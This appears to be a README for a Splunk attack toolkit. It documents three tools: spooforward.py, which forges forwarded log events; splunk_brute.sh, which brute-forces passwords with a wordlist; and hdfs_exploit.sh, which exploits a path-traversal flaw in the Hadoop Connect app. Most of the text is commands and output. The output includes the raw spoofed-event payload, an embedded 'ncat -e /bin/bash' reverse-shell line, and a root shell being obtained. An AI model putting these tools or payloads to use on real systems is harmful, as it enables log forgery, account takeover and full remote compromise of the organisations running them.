## [spooforward.py]

[i] Splunk forward spoofer v0.1

USAGE: ./spooforward.py [options]:

	-r, --host <file>	Server address (indexer instance)
	-p, --port <address>	Server port (default: 9997)
	-s, --source <pid>	Spoofed source ex. udp:514
	-l, --shost <num>	Spoofed host address
	-t, --type <type>	Source type
	-i, --index <index>	Index to forward to ex. default, main
	-m, --message <message>	 Spoofed event content (limit: 255)
	-d, --debug	 Enable debugging
	-c, --check	 Scan host
	-h, --help	 This help message


Example:

```
▶ ~/DEV/splunk_tools ◀
root@postern ⌁ ./spooforward.py -c -d -r 127.0.0.1 -l spoofedaddr.net -i main -t spoofedtype -s spoofedsource  -m "some event message"

[i] Splunk forward spoofer v0.1

[i] Scanning host 127.0.0.1...

[+] Found active port: 9997

[DBG] [PLD] '\xfe\x03\x16source::spoofedsource\x16host::spoofedaddr.net\x0cspoofedtype\x022\x00\xfc\x03\xff\x06\xc4\xc0\x85\xcc\x9d\x9b\xf0\xa3\xe0\x01b\x01\x08\x97\xa1\xe5\xb6\x05\x03J.0\x04\x05_path\x0c/tmp/unknown\x04\x0f_MetaData:Index\x04main\x12some event message'

[DBG] [RCV] '\x00\x00\x00\x9a\x00\x00\x00\x01\x00\x00\x00\x12__s2s_control_msg\x00\x00\x00\x00ocap_response=success;cap_flush_key=true;idx_can_send_hb=true;idx_can_recv_token=true;v4=true;channel_limit=300\x00\x00\x00\x00\x00\x00\x00\x00\x05_raw\x00'

[DBG] [FIN] PAYLOAD SUCCESSFULY SENT
```


## [splunk_brute.sh]

```
▶ ~/DEV/splunk_tools ◀
root@postern ⌁ ./splunk_brute.sh test_acc /usr/share/wordlists/rockyou.txt 127.0.0.1 8000

[!] Bruteforcing password for test_acc on 127.0.0.1...
.......................................................
SUCCESS! U: test_acc P: 1234567890

...Terminated
```

## [hdfs_exploit.sh]

Splunk Hadoop Connect Remote Code Execution

This script exploits path traversal vulnerability in Splunk app "Hadoop Connect"
export_hdfs.py script can be abused by specially crafted event to drop its contents
into /opt/splunk/bin/scripts/ executable directory.

This exploit need to meet several requirements:
* Ability to craft logs on system (see spooforward.py)
* Have HadoopConnect app installed

Usage:

        case "${option}"

        in
                h) rhost=${OPTARG};; # Remote host
		
                p) rport=${OPTARG};; # Remote port
		
                l) lhost=${OPTARG};; # Local host
		
                s) lport=${OPTARG};; # Local port
		
		o) proto=${OPTARG};; # Protocol [http|https]
		
		m) marker=${OPTARG};;# Unique string to search for
		
  	        u) uname=${OPTARG};; # Splunk user
		
		w) passw=${OPTARG};; # Splunk password
		
 	        c) scanhost="-c";;   # Scan host for spoofing capabilities
		
		e) spoof="NO";;      # Dont try to spoof event (already there)

```
▶ ~/DEV/splunk_tools ◀
root@postern ⌁ ./hdfs_exploit.sh -c -h 127.0.0.1 -m w00tw00tw00t

[i] Splunk forward spoofer v0.1

[i] Scanning host 127.0.0.1...

[+] Found active port: 9997

[DBG] [PLD] "\xfe\x03\nsource::.\thost::..\x02.\x022\x00\xfc\x03\xff\x06\xc4\xc0\x85\xcc\x9d\x9b\xf0\xa3\xe0\x01b\x01\x08\x97\xa1\xe5\xb6\x05\x03J.0\x04\x05_path\x0c/tmp/unknown\x04\x0f_MetaData:Index\x04mainY#!/usr/bin/python\nimport os;os.system('ncat -e /bin/bash 127.0.0.1 4444');# w00tw00tw00t "

[DBG] [RCV] '\x00\x00\x00\x9a\x00\x00\x00\x01\x00\x00\x00\x12__s2s_control_msg\x00\x00\x00\x00ocap_response=success;cap_flush_key=true;idx_can_send_hb=true;idx_can_recv_token=true;v4=true;channel_limit=300\x00\x00\x00\x00\x00\x00\x00\x00\x05_raw\x00'

[DBG] [FIN] PAYLOAD SUCCESSFULY SENT

[PWN] Waiting for shell...
Listening on [0.0.0.0] (family 0, port 4444)
nc -lvp${lport}
Connection from localhost 44056 received!
id
uid=0(root) gid=0(root) groups=0(root)
pwd
/opt/splunk/etc/apps/search/bin
uname -a
Linux postern 4.8.0-kali2-amd64 #1 SMP Debian 4.8.15-1kali1 (2016-12-23) x86_64 GNU/Linux
```



